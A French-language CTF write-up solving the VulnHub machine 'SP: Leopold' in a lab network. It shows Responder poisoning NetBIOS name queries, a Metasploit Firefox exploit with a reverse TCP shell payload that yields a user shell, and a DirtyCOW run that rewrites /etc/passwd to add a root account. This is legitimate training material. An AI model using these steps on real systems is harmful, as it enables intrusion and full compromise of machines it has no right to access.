# Solution du CTF SP: Leopold de VulnHub

[SP: leopold](https://www.vulnhub.com/entry/sp-leopold-v12,277/) est un challenge qui a été mis en ligne sur VulnHub en septembre 2019. On a deux flags à trouver et le scénario est le suivant :

> Leopold is a poor adventurous little Internet user trying to find amusement.

Le CTF est marqué comme de difficulté débutant ou intermédaire mais il requiert de mon point de vue une approche que seulement les plus confirmés sauront rapidement entrevoir.

```
Nmap scan report for 192.168.56.81
Host is up (0.00014s latency).
Not shown: 65533 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.6.6 (workgroup: WORKGROUP)
MAC Address: 08:00:27:46:98:4D (Oracle VirtualBox virtual NIC)

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: -30m02s, deviation: 42m25s, median: -1h00m02s
|_nbstat: NetBIOS name: LEOPOLD, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Unix (Samba 3.6.6)
|   Computer name: leopold
|   NetBIOS computer name: 
|   Domain name: 
|   FQDN: leopold
|_  System time: 2022-12-21T08:39:27+01:00
```

On a donc deux et seul SMB est intéressant pour le moment.

## Broucouille

`smbclient` n'y voit pas de partage de fichier. J'ai lancé `enum4linux` qui a quand même pu vérifier la présence de l'utiisateur `leopold`.

```
 ==================( Users on 192.168.56.81 via RID cycling (RIDS: 500-550,1000-1050) )==================
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[I] Found new SID:                                                                                                                                                                                                                          
S-1-22-1                                                                                                                                                                                                                                    

[I] Found new SID:                                                                                                                                                                                                                          
S-1-5-32                                                                                                                                                                                                                                    

[I] Found new SID:                                                                                                                                                                                                                          
S-1-5-32                                                                                                                                                                                                                                    

[I] Found new SID:                                                                                                                                                                                                                          
S-1-5-32                                                                                                                                                                                                                                    

[I] Found new SID:                                                                                                                                                                                                                          
S-1-5-32                                                                                                                                                                                                                                    

[+] Enumerating users using SID S-1-5-21-3284069608-197293652-1787085090 and logon username '', password ''                                                                                                                                 
                                                                                                                                                                                                                                            
S-1-5-21-3284069608-197293652-1787085090-501 LEOPOLD\nobody (Local User)                                                                                                                                                                    
S-1-5-21-3284069608-197293652-1787085090-513 LEOPOLD\None (Domain Group)

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''                                                                                                                                                                 
                                                                                                                                                                                                                                            
S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                                                                                                                                                           
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                                                                                                                                 
                                                                                                                                                                                                                                            
S-1-22-1-1000 Unix User\leopold (Local User)
```

Après une tentative de casser l'account unix avec Hydra ou Ncrack force est de constater que ce n'est pas le chemin attendu.

Côté exploits pour le `Samba` il pourrait y avoir le module `linux/samba/is_known_pipename` de Metasploit mais ce dernier nécessite l'accès à un partage en écriture...

J'ai finalement mis en écoute le trafic réseau et vu quelques résolutions de noms Netbios passer :

![VulnHub CTF Leopold NBNS queries](https://raw.githubusercontent.com/devl00p/blog/master/images/vulnhub/leopold_smb_query.png)

J'ai alors mis en écoute `Responder` :

```shellsession
┌──(kali㉿kali)-[~]
└─$ sudo responder -I eth0 -v    
[sudo] Mot de passe de kali : 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [OFF]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [eth0]
    Responder IP               [192.168.56.79]
    Responder IPv6             [fe80::6fc7:e962:d114:65d6]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-C27003OPVNG]
    Responder Domain Name      [9JJI.LOCAL]
    Responder DCE-RPC Port     [45929]

[+] Listening for events...                                                                                                                                                                                                                 

[*] [NBT-NS] Poisoned answer sent to 192.168.56.81 for name SAFEBROWSING.CL (service: Workstation/Redirector)
[*] [NBT-NS] Poisoned answer sent to 192.168.56.81 for name VIDEOSEARCH.UBU (service: Workstation/Redirector)
[*] [NBT-NS] Poisoned answer sent to 192.168.56.81 for name VIDEOSEARCH.UBU (service: Workstation/Redirector)
[*] [NBT-NS] Poisoned answer sent to 192.168.56.81 for name DISNEYWORLD (service: Workstation/Redirector)
```

La requête à destination de `videosearch` avait un user-agent *Unity Video Lens Remote Scope v0.4* que j'avais jamais vu.

```http
```http
GET /v0/search?q=&sources=Amazon HTTP/1.1
Host: videosearch.ubuntu.com
User-Agent: Unity Video Lens Remote Scope v0.4
Connection: Keep-Alive
```
```

Après recherche c'est lié à ce paquet et potentiellement à *UbuntuTV* :

[Bug #1079699 “Empty queries being sent to videosearch” : Bugs : unity-lens-video package : Ubuntu](https://bugs.launchpad.net/ubuntu/+source/unity-lens-video/+bug/1079699)

Je n'ai trouvé aucun exploit relatif.

La requête à `disneyworld` indique un User-Agent *Firefox 16* :

```http
GET / HTTP/1.1
Host: disneyworld
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:16.0) Gecko/20100101 Firefox/16.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive

```

## Braconnage de panda roux

Une recherche dans Metasploit des exploits pour Firefox sous Linux ne m'a rien retourné de probant mais une recherche plus générale ressortait le module `firefox_tostring_console_injection`.

La description est la suivante :

>   This exploit gains remote code execution on Firefox 15-22 by abusing  two separate Javascript-related vulnerabilities to ultimately inject 
>   malicious Javascript code into a context running with chrome:// privileges.

Je n'ai pas trouvé d'explications détaillées sur le web mais l'exploitation fonctionne avec l'aide de `Responder` qui usurpe le domaine demandé :

```
msf6 exploit(multi/browser/firefox_tostring_console_injection) > show options

Module options (exploit/multi/browser/firefox_tostring_console_injection):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CONTENT                   no        Content to display inside the HTML <body>.
   Retries  true             no        Allow the browser to retry the module
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  80               yes       The local port to listen on.
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH  /                no        The URI to use for this exploit (default is random)


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.56.79    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Universal (Javascript XPCOM Shell)



View the full module info with the info, or info -d command.

msf6 exploit(multi/browser/firefox_tostring_console_injection) > exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/browser/firefox_tostring_console_injection) > 
[*] Started reverse TCP handler on 192.168.56.79:4444 
[*] Using URL: http://192.168.56.79/
[*] Server started.
[-] 192.168.56.81    firefox_tostring_console_injection - Target 192.168.56.81 has requested an unknown path: /safebrowsing/downloads
[-] 192.168.56.81    firefox_tostring_console_injection - Target 192.168.56.81 has requested an unknown path: /v0/search?q=&sources=Amazon
[-] 192.168.56.81    firefox_tostring_console_injection - Target 192.168.56.81 has requested an unknown path: /safebrowsing/downloads                                                                                                       
[-] 192.168.56.81    firefox_tostring_console_injection - Target 192.168.56.81 has requested an unknown path: /v0/search?q=&sources=Amazon
[-] 192.168.56.81    firefox_tostring_console_injection - Target 192.168.56.81 has requested an unknown path: /v0/sources
[-] 192.168.56.81    firefox_tostring_console_injection - Target 192.168.56.81 has requested an unknown path: /v0/search?q=&sources=Amazon
[-] 192.168.56.81    firefox_tostring_console_injection - Target 192.168.56.81 has requested an unknown path: /v0/sources
[*] 192.168.56.81    firefox_tostring_console_injection - Gathering target information for 192.168.56.81
[*] 192.168.56.81    firefox_tostring_console_injection - Sending HTML response to 192.168.56.81
[-] 192.168.56.81    firefox_tostring_console_injection - Target 192.168.56.81 has requested an unknown path: /favicon.ico
[[-] 192.168.56.81    firefox_tostring_console_injection - Target 192.168.56.81 has requested an unknown path: /v0/sources
[*] 192.168.56.81    firefox_tostring_console_injection - Gathering target information for 192.168.56.81
[*] 192.168.56.81    firefox_tostring_console_injection - Sending HTML response to 192.168.56.81
[-] 192.168.56.81    firefox_tostring_console_injection - Target 192.168.56.81 has requested an unknown path: /favicon.ico
[-] 192.168.56.81    firefox_tostring_console_injection - Target 192.168.56.81 has requested an unknown path: /favicon.ico
[*] Command shell session 1 opened (192.168.56.79:4444 -> 192.168.56.81:42843) at 2022-12-21 13:09:10 +0100
msf6 exploit(multi/browser/firefox_tostring_console_injection) > sessions -i 1
[*] Starting interaction with 1...

id
uid=1000(leopold) gid=1000(leopold) groups=1000(leopold),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),107(lpadmin),124(sambashare)

```

On trouve notre premier flag :

```shellsession
leopold@leopold:/home/leopold$ cat flag.txt 
924adc9f3f14672ab03903
```

Pour la suite je n'ai rien vu de custom pour passer root mais la machine est vulnérable à `DirtyCOW` :

```shellsession
leopold@leopold:/home/leopold$ gcc -o dirty dirty.c 
gcc: error trying to exec 'cc1': execvp: No such file or directory
leopold@leopold:/home/leopold$ find / -name cc1 2> /dev/null 
/usr/lib/gcc/i686-linux-gnu/4.7/cc1
leopold@leopold:/home/leopold$ export PATH=/usr/lib/gcc/i686-linux-gnu/4.7/:$PATH
leopold@leopold:/home/leopold$ gcc -o dirty dirty.c 
/tmp/ccVYqtCk.o: In function `generate_password_hash':
dirty.c:(.text+0x16): undefined reference to `crypt'
/tmp/ccVYqtCk.o: In function `main':
dirty.c:(.text+0x4d2): undefined reference to `pthread_create'
dirty.c:(.text+0x508): undefined reference to `pthread_join'
collect2: error: ld returned 1 exit status
leopold@leopold:/home/leopold$ gcc -o dirty dirty.c -lpthread -lcrypt
leopold@leopold:/home/leopold$ ./dirty 
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 
Complete line:
firefart:fik9Kb9f4rF2w:0:0:pwned:/root:/bin/bash

mmap: b7733000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'devloop'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'devloop'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
leopold@leopold:/home/leopold$ su firefart
Password: 
firefart@leopold:/home/leopold# cd /root
firefart@leopold:~# ls
flag.txt
firefart@leopold:~# cat flag.txt
53b0af358e2bfcef9883f25fc
```

*Publié le 21 décembre 2022*
